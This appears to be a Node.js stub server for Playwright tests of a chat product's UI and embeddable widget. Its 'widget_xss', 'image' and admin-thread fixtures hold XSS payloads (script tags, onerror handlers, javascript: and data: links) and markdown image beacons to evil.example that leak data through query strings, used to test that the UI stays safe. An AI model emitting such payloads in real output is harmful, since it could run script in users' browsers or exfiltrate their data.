// SPDX-License-Identifier: Apache-2.0

// Control-plane + edge stub for the chat characterization suite
// (playwright.chat.config.ts). One port answers both CONTROL_PLANE_URL and
// EDGE_URL. POST /api/v1/chat/stream plays a scripted SSE chosen by the first
// word of the message ("scenario:<name> ..."); every chat request body is
// recorded and served at GET /__requests (reset with DELETE /__requests).
import { readFileSync } from "node:fs";
import http from "node:http";

import {
  DEMO_AI_CONFIG,
  DEMO_DOCUMENTS,
  DEMO_EMBEDDINGS,
  DEMO_FOLDERS,
  DEMO_USER,
  DEMO_WORKSPACES,
  README_SCENARIOS,
  demoHostPage,
} from "./readme-fixtures.mjs";

const PORT = Number(process.env.CHAT_STUB_PORT ?? 58130);
const requests = [];

const json = (res, status, body, headers = {}) => {
  res.writeHead(status, { "Content-Type": "application/json", ...headers });
  res.end(JSON.stringify(body));
};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const DOC_SOURCE = {
  type: "doc",
  document_id: "doc-1",
  filename: "handbook.pdf",
  title: "Employee handbook",
  score: 0.91,
  text: "Employees get 20 days of annual leave.",
};
const WEB_SOURCE = {
  type: "web",
  url: "https://www.example.org/leave-policy",
  title: "Leave policy explained",
  query: "annual leave policy",
  read_status: "ok",
  excerpt: "A summary of statutory leave.",
};

// Each step: [event | null (default "message" data frame), payload, delayMs].
const SCENARIOS = {
  full: [
    ["meta", { conversation_id: "conv-1", message_id: "msg-1" }],
    ["search_progress", { status: "reading" }, 150],
    ["thinking", { delta: "Checking the handbook. " }],
    ["tool_call", { id: "t1", name: "jira_search" }],
    ["tool_result", { id: "t1", ok: true }],
    ["sources", { sources: [DOC_SOURCE, WEB_SOURCE] }],
    [null, { delta: "Employees get **20 days** of leave [1]" }],
    [null, { delta: " and statutory rules apply [2]." }],
    ["done", { message_id: "msg-1" }],
  ],
  // Widget: hostile markdown + markup must render as inert text (widget.spec).
  widget_xss: [
    ["meta", { conversation_id: "conv-xss", message_id: "msg-xss" }],
    ["sources", { sources: [{ ...DOC_SOURCE, filename: '<img src=x onerror="window.__xss=1">' }] }],
    [null, { delta: "**Safe** answer [1] with *notes*, `<b>code</b>` and [docs](https://example.org/docs).\n\n" }],
    [null, { delta: '<script>window.__xss=1</script> <img src=x onerror="window.__xss=1"> &lt;i&gt;\n\n' }],
    [null, { delta: "- [click](javascript:window.__xss=1)\n- [data](data:text/html,<script>window.__xss=1</script>)\n" }],
    [null, { delta: "1. first\n2. second [7]" }],
    ["done", { message_id: "msg-xss" }],
  ],
  deep: [
    ["meta", { conversation_id: "conv-2", message_id: "msg-2" }],
    ["deep_progress", { queries: ["leave policy 2026", "statutory leave rules"] }, 100],
    ["search_progress", { status: "reading" }, 1500],
    ["search_progress", { status: "synthesizing" }, 300],
    ["sources", { sources: [WEB_SOURCE] }],
    [null, { delta: "Deep answer [1]." }],
    ["done", { message_id: "msg-2" }],
  ],
  midstream_error: [
    ["meta", { conversation_id: "conv-3", message_id: "msg-3" }],
    [null, { delta: "Partial " }],
    ["error", { error: "upstream_error", code: "upstream_error", message: "upstream failed" }],
  ],
  unknown_error: [
    ["meta", { conversation_id: "conv-4", message_id: "msg-4" }],
    ["error", { error: "x", code: "brand_new_code", message: "Edge says no." }],
  ],
  image: [
    ["meta", { conversation_id: "conv-5", message_id: "msg-5" }],
    [null, { delta: "Inline ![leak](https://evil.example/pixel.png?d=secret) and ![logo](/icon.svg) end." }],
    ["done", { message_id: "msg-5" }],
  ],
  web_offer: [
    ["meta", { conversation_id: "conv-6", message_id: "msg-6" }],
    ["web_offer", { question: "scenario:web_offer what is new?" }],
    [null, { delta: "The documents do not say." }],
    ["done", { message_id: "msg-6" }],
  ],
  web_unavailable: [
    ["meta", { conversation_id: "conv-7", message_id: "msg-7" }],
    ["web_unavailable", { reason: "disabled" }],
    [null, { delta: "From documents only." }],
    ["done", { message_id: "msg-7" }],
  ],
  reconnect: [
    ["meta", { conversation_id: "conv-8", message_id: "msg-8" }],
    [null, { delta: "Partial before drain" }, 50],
    [
      "reconnect",
      {
        reason: "server_shutdown",
        retry_after_ms: 200,
        code: "draining",
        message: "restarting",
        conversation_id: "conv-8",
        message_id: "msg-8",
      },
    ],
  ],
  resume: [
    ["meta", { conversation_id: "conv-8", message_id: "msg-8" }],
    [null, { delta: "Fresh resumed answer." }],
    ["done", { message_id: "msg-8" }],
  ],
  slow: [
    ["meta", { conversation_id: "conv-9", message_id: "msg-9" }],
    ...Array.from({ length: 60 }, (_, i) => [null, { delta: `tok${i} ` }, 200]),
  ],
};

async function streamScenario(req, res, steps) {
  res.writeHead(200, {
    "Content-Type": "text/event-stream; charset=utf-8",
    "Cache-Control": "no-cache, no-transform",
    Connection: "keep-alive",
  });
  let closed = false;
  res.on("close", () => (closed = true));
  for (const [event, payload, delay = 30] of steps) {
    if (closed) return;
    await sleep(delay);
    res.write(`${event ? `event: ${event}\n` : ""}data: ${JSON.stringify(payload)}\n\n`);
  }
  res.end();
}

function chat(req, res, body) {
  requests.push({
    body,
    idempotencyKey: req.headers["idempotency-key"] ?? null,
    acceptLanguage: req.headers["accept-language"] ?? null,
  });
  if (body.resume_message_id) return streamScenario(req, res, SCENARIOS.resume);
  if (README_SCENARIOS[body.message]) return streamScenario(req, res, README_SCENARIOS[body.message]);
  const name = String(body.message ?? "").match(/^scenario:(\w+)/)?.[1] ?? "full";
  if (name === "rate_limited") {
    return json(res, 429, { error: "rate_limited", code: "rate_limited", message: "slow down" }, { "Retry-After": "7" });
  }
  return streamScenario(req, res, SCENARIOS[name] ?? SCENARIOS.full);
}

const WIDGET_CONVERSATION = {
  id: "conv-widget-visitor",
  title: "Pricing question",
  user_email: "",
  user_id: "",
  workspace_id: "ws-support",
  workspace_name: "Nebula Destek",
  evaluation_score: 0.42,
  is_flagged: true,
  created_at: "2026-10-14T09:30:00Z",
};
const WIDGET_THREAD = [
  { role: "user", content: "![visitor](https://evil.example/visitor.png?who=admin) hi" },
  {
    role: "assistant",
    content:
      "Here you go: ![beacon](https://evil.example/beacon.png?c=1) and ![rel](//evil.example/rel.png)\n\n" +
      '![logo](/icon.svg) [click](javascript:alert(1)) <img src="https://evil.example/raw.png" onerror="alert(1)">',
    sources: JSON.stringify([{ filename: "Destek_SLA_Matrisi_2026.xlsx", score: 0.9 }]),
  },
];

// Admin pages (a11y suite) sign in with an access token whose `sub` is "admin".
function bearerSub(req) {
  const token = String(req.headers.authorization ?? "").replace(/^Bearer /, "");
  try {
    return JSON.parse(Buffer.from(token.split(".")[1] ?? "", "base64url").toString()).sub ?? null;
  } catch {
    return null;
  }
}

// Onboarding state: POST /__onboarding {"has_super_admin": bool} switches the
// wizard between the first-admin form and the workspace step.
const onboarding = { onboarded: false, has_super_admin: true, setup_token_required: false };

const ADMIN_ME = {
  id: "admin",
  email: "ayse.demir@nebulacrm.example",
  role: "SUPER_ADMIN",
  org_id: "org1",
  full_name: "Ayşe Demir",
  locale: "en",
  timezone: "Europe/Istanbul",
  answer_style: "balanced",
  preferred_chat_model: null,
};
const WORKSPACES = [
  { id: "ws-1", org_id: "org1", team_id: null, name: "Handbook", type: "INTERNAL", cors_allowed_origins: [], web_search_enabled: true, personalization_enabled: false, memory_enabled: false },
  { id: "ws-2", org_id: "org1", team_id: null, name: "Support", type: "EXTERNAL", cors_allowed_origins: ["https://www.example.com"], web_search_enabled: false, personalization_enabled: false, memory_enabled: true },
];
const DOCUMENTS = [
  { id: "d1", workspace_id: "ws-1", filename: "handbook.pdf", file_size: 120000, status: "SUCCESS", error_code: null, error_params: null, error_message: null, created_at: "2026-11-01T10:00:00Z", retry_count: 0, folder_id: null },
  { id: "d2", workspace_id: "ws-1", filename: "big.pdf", file_size: 9000000, status: "FAILED", error_code: "parse_limit", error_params: { kind: "pdf_pages", limit: 1000 }, error_message: "PDF has more than 1000 pages.", created_at: "2026-11-02T10:00:00Z", retry_count: 3, folder_id: null },
  { id: "d3", workspace_id: "ws-1", filename: "notes.txt", file_size: 2000, status: "PROCESSING", error_code: null, error_params: null, error_message: null, created_at: "2026-11-03T10:00:00Z", retry_count: 0, folder_id: null },
];
const PROFILE = {
  user: { ...ADMIN_ME, job_title: "Engineer", department: null, phone: null, location_id: null },
  manager_display: null,
  tenure_days: null,
};

const ROUTES = {
  "GET /api/v1/onboarding/state": () => onboarding,
  "POST /api/v1/onboarding/workspace": () => ({
    workspace: { id: "ws-1", name: "Handbook", type: "INTERNAL" },
    embed_snippet: null,
    invite_token: null,
    invite_accept_path: null,
  }),
  "GET /api/v1/admin/orgs/org1/workspaces": () => WORKSPACES,
  "GET /api/v1/admin/orgs/org1/teams": () => [],
  "GET /api/v1/admin/workspaces/ws-1/settings": () => ({
    workspace_id: "ws-1",
    web_search_enabled: true,
    personalization_enabled: false,
    memory_enabled: false,
    memory_available: true,
  }),
  "GET /api/v1/admin/workspaces/ws-1/folders": () => [],
  "GET /api/v1/admin/workspaces/ws-1/documents": () => DOCUMENTS,
  "GET /api/v1/auth/profile": () => PROFILE,
  "GET /api/v1/auth/me": () => ({
    id: "u1",
    email: "okan.yildiz@nebulacrm.example",
    role: "STAFF",
    org_id: "org1",
    full_name: "Okan Yıldız",
    locale: "en",
    timezone: "Europe/Istanbul",
    answer_style: "balanced",
    preferred_chat_model: null,
  }),
  "GET /api/v1/workspaces": () => [{ id: "ws-1", name: "Handbook", type: "INTERNAL" }],
  "GET /api/v1/models": () => ({ default_model: "model-a", allowed_models: ["model-a", "model-b"] }),
  "GET /api/v1/skills": () => [],
  "GET /api/v1/auth/memory": () => [],
  "GET /api/v1/scheduled-tasks": () => [],
  "GET /api/v1/notifications": () => ({ items: [], unread: 0 }),
  "GET /api/v1/integrations/available": () => [],
  "GET /api/v1/conversations": () => [],
};

http
  .createServer((req, res) => {
    let raw = "";
    req.on("data", (c) => (raw += c));
    req.on("end", () => {
      const path = new URL(req.url, "http://stub").pathname;
      if (path === "/__requests") {
        if (req.method === "DELETE") requests.length = 0;
        return json(res, 200, requests);
      }
      if (path === "/healthz") return json(res, 200, { ok: true });
      if (path === "/__onboarding" && req.method === "POST") {
        Object.assign(onboarding, JSON.parse(raw || "{}"));
        return json(res, 200, onboarding);
      }
      if (path === "/api/v1/auth/me" && bearerSub(req) === "admin") return json(res, 200, ADMIN_ME);
      // Admin conversation viewer: a widget-visitor thread whose stored answer
      // carries hostile markdown (admin-markdown.spec).
      if (bearerSub(req) === "admin") {
        if (path === "/api/v1/admin/conversations") return json(res, 200, [WIDGET_CONVERSATION]);
        if (path === `/api/v1/admin/conversations/${WIDGET_CONVERSATION.id}/messages`) {
          return json(res, 200, WIDGET_THREAD);
        }
      }
      // README visuals: the "Nebula Teknoloji" demo persona and its data.
      if (bearerSub(req) === "demo") {
        const demo = {
          "/api/v1/auth/me": DEMO_USER,
          "/api/v1/workspaces": DEMO_WORKSPACES,
          "/api/v1/auth/profile": { user: DEMO_USER, manager_display: "Mehmet Yılmaz", tenure_days: 812 },
          "/api/v1/admin/workspaces/ws-company/folders": DEMO_FOLDERS,
          "/api/v1/admin/workspaces/ws-company/documents": DEMO_DOCUMENTS,
          "/api/v1/admin/ai-config": DEMO_AI_CONFIG,
          "/api/v1/models": DEMO_AI_CONFIG,
          "/api/v1/admin/embeddings": DEMO_EMBEDDINGS,
        }[path];
        if (demo) return json(res, 200, demo);
      }
      // The embeddable widget: loader, token and a plain host page, all on this
      // origin (the stub plays the edge).
      if (path === "/widgets/embed.js") {
        res.writeHead(200, { "Content-Type": "text/javascript; charset=utf-8" });
        return res.end(readFileSync(new URL("../../../widget/embed.js", import.meta.url)));
      }
      if (path === "/api/v1/widget/token" && req.method === "POST") {
        return json(res, 200, { token: "widget-demo", primary_color: "#0a5bff", name: "Nebula Destek", expires_in: 900 });
      }
      if (path === "/demo/support.html") {
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        return res.end(demoHostPage(`http://${req.headers.host}`));
      }
      // A user with no stored timezone: the UI must fall back to the browser's.
      if (bearerSub(req) === "tzless") {
        if (path === "/api/v1/auth/me") return json(res, 200, { ...ROUTES["GET /api/v1/auth/me"](), id: "tzless", timezone: null });
        if (path === "/api/v1/auth/profile") {
          return json(res, 200, { ...PROFILE, user: { ...PROFILE.user, id: "tzless", timezone: null } });
        }
      }
      if (req.method === "POST" && path === "/api/v1/chat/stream") {
        let body = {};
        try {
          body = JSON.parse(raw || "{}");
        } catch {
          /* recorded as {} */
        }
        return void chat(req, res, body);
      }
      const route = ROUTES[`${req.method} ${path}`];
      if (route) return json(res, 200, route());
      return json(res, 404, { detail: "not found" });
    });
  })
  .listen(PORT, "127.0.0.1", () => console.log(`chat stub on :${PORT}`));
